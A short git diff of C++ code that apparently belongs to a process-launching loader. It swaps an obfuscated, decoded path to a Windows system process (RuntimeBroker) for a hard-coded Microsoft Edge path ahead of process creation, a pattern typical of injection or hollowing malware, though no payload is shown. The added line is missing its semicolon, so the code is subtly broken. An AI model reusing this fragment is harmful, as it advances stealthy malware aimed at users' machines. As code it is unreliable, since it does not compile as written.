@@ -68,7 +68,7 @@ void main_star() {
     
     std::string runtime_broker_kum = getoriginal(runtime_broker, big_string, sizeof(runtime_broker));
     //std::cout <<getoriginal(runtime_broker, big_string, sizeof(runtime_broker)) << std::endl;
-    const char* processptaah = runtime_broker_kum.c_str();
+    const char* processptaah = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"
 
     STARTUPINFO li = {0};
     
